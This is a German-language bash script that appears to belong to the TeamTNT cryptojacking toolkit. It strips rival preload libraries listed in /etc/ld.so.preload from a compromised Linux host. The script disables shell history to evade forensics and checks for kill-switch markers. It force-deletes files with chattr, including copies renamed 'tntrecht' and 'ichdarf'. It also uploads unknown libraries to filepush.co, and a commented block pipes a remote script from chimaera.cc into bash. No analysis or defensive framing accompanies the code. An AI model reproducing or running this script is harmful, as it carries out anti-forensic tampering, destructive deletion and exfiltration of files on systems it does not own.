

if [ -f "/etc/lib.so" ];then exit ; fi
if [ "$(hostname)" = "HaXXoRsMoPPeD" ]; then exit ; fi

export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin

# cat /etc/hosts | grep 'chimaera.cc' || echo '45.9.148.108 chimaera.cc' >> /etc/hosts
#	curl -sLk http://chimaera.cc/sh/clean/ld.so.preload.sh | bash
#	wget -q -O - http://chimaera.cc/sh/clean/ld.so.preload.sh | bash

clear
echo ""
echo ""
echo ""


function DATEI_ENTFERNEN(){
ZIELDATEI=$1

chattr -ia $ZIELDATEI 2>/dev/null 1>/dev/null
tntrecht -ia $ZIELDATEI 2>/dev/null 1>/dev/null
ichdarf -ia $ZIELDATEI 2>/dev/null 1>/dev/null
	chmod 1777 $ZIELDATEI 2>/dev/null 1>/dev/null
rm -fr $ZIELDATEI 2>/dev/null 1>/dev/null
	if [ -f "$ZIELDATEI" ]; then 
	echo -e " \e[1;33;41m$ZIELDATEI loeschen fehlgeschlagen!\033[0m"
	else echo -e "\033[0;32m $ZIELDATEI erfolgreich geloescht!\033[0m"
	fi
}


function TeamTNT_UNHIDE(){
SO_DATEI=$1
strings $SO_DATEI >> /var/tmp/.TNT.cleaner.log 2>/dev/null
grep -C 1 '/proc/self/fd/%d' /var/tmp/.TNT.cleaner.log > /var/tmp/.TNT.cleaner.unhide 2>/dev/null
rm -f /var/tmp/.TNT.cleaner.log 2>/dev/null 1>/dev/null
TNT_UNHIDE=$(cat /var/tmp/.TNT.cleaner.unhide | head -n 1) 2>/dev/null
rm -f /var/tmp/.TNT.cleaner.unhide 2>/dev/null 1>/dev/null

if [ ! -z "$TNT_UNHIDE" ]; then
echo -e " \e[1;33;41mDer Prozess $TNT_UNHIDE wurde versteckt!\033[0m"
else
echo -e "\033[0;33m TeamTNT UNHIDE fail! Uploading...\033[0m"
curl --upload-file $SO_DATEI https://filepush.co/upload/
fi
}




echo -e "\n\n\033[0;33m Prüfe preloadfähige Datei:\n ~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0m"

if [ -f "/etc/ld.so.preload" ]; then 
echo -e " \e[1;33;41m/etc/ld.so.preload gefunden\033[0m";echo -e " \033[0;33m(prüfe auf enthaltene Dateien)\033[0m"
PRELOAD_DATEI_VAR=$(cat /etc/ld.so.preload)

if [ -z "$PRELOAD_DATEI_VAR" ]; then 
echo -e "\033[0;32m Keine Dateiverweise enthalten.\033[0m";echo -e "\033[0;32m Leere Datei wird entfernt.\033[0m"
DATEI_ENTFERNEN /etc/ld.so.preload
else

for PRELOAD_DATEI in ${PRELOAD_DATEI_VAR[@]}; do
if [ -f "$PRELOAD_DATEI" ]; then 
echo -e " \e[1;33;41m$PRELOAD_DATEI gefunden (loesche)\033[0m"
TeamTNT_UNHIDE $PRELOAD_DATEI
DATEI_ENTFERNEN $PRELOAD_DATEI
else 
echo -e "\033[0;32m $PRELOAD_DATEI nicht gefunden.\033[0m" ; fi
done
fi
DATEI_ENTFERNEN /etc/ld.so.preload

else 
echo -e "\033[0;32m /etc/ld.so.preload nicht gefunden.\033[0m"
fi



echo -e "\n\n\033[0;33m Prüfe preloadfähige Systemvariablen:\n ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0m"
	if [ -z "$LD_PRELOAD" ] ; then echo -e "\033[0;32m LD_PRELOAD ist nicht gesetzt.\033[0m"
	else echo -e " \e[1;33;41mLD_PRELOAD ist gesetzt: $LD_PRELOAD\033[0m" ; fi
		if [ -z "$LD_LIBRARY_PATH" ] ; then echo -e "\033[0;32m LD_LIBRARY_PATH ist nicht gesetzt.\033[0m"
		else echo -e " \e[1;33;41mLD_LIBRARY_PATH ist gesetzt: $LD_LIBRARY_PATH\033[0m" ; fi
	if [ -z "$LDR_PRELOAD" ] ; then echo -e "\033[0;32m LDR_PRELOAD ist nicht gesetzt.\033[0m"
	else echo -e " \e[1;33;41mLDR_PRELOAD ist gesetzt: $LDR_PRELOAD\033[0m" ; fi
		if [ -z "$LDR_PRELOAD64" ] ; then echo -e "\033[0;32m LDR_PRELOAD64 ist nicht gesetzt.\033[0m"
		else echo -e " \e[1;33;41mLDR_PRELOAD64 ist gesetzt: $LDR_PRELOAD64\033[0m" ; fi				


echo ""
echo ""
echo ""






